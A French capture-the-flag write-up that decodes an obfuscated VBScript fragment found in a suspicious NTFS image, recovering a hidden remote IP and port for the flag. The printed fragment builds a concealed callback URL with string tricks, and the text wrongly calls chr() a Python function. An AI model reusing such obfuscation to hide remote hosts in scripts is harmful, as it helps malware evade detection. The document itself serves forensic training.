---
title: suspicious_ntfs_drive
categories: [leHACK_2023, Forensic_leHACK]
tags: [Autopsy, image_file]
image: '/assets/images/leHACK_2023/leHACK.jpg'
---

## 𝄞 Introduction

![Intro](/assets/images/leHACK_2023/forensic/intro.png)

## 𝄞 Solution

Pour résoudre ce défi de forensic, j'ai commencé par analyser l'image avec le logiciel **Autopsy**.
Notre objectif était de trouver les informations suivantes : **filename.vbs_IP_port** pour trouver le flag.

![Autopsy](/assets/images/leHACK_2023/forensic/vbs.png)

Nous avons trouvé un fichier nommé **security_launch.vbs**.

```
aaa = replace("hello","h","w")
bbb = StrReverse("86")
ccc = Right("90018000",4)
dest = "http://"+chr(49)+"93.1"+bbb+".1.42:"+ccc+"/dothethingzuulee"
```

## 𝄞𝄞 Analyse

Nous allons analyser chaque ligne :

**aaa = replace("hello","h","w")** --> remplace le *h* par *w* dans le chaine **hello** ce qui donne **wello**.   
**bbb = StrReverse("86")** --> on **reverse** *86* ce qui donne *68*  
**ccc = Right("90018000",4)** --> on prends les 4 caractères à droite => 8000  
**dest = "http://"+chr(49)+"93.1"+bbb+".1.42:"+ccc+"/dothethingzuulee"**  
**chr()** est une fonction python qui convertie la valeur en ASCII ici 49 = 1

donc si on remplace nos valeurs on obtien : 193.168.1.42:8000

𝄞 FLAG : `leHACK{security_launch.vbs_193.168.1.42_8000}` 𝄞 

## 𝄞 Conclusion








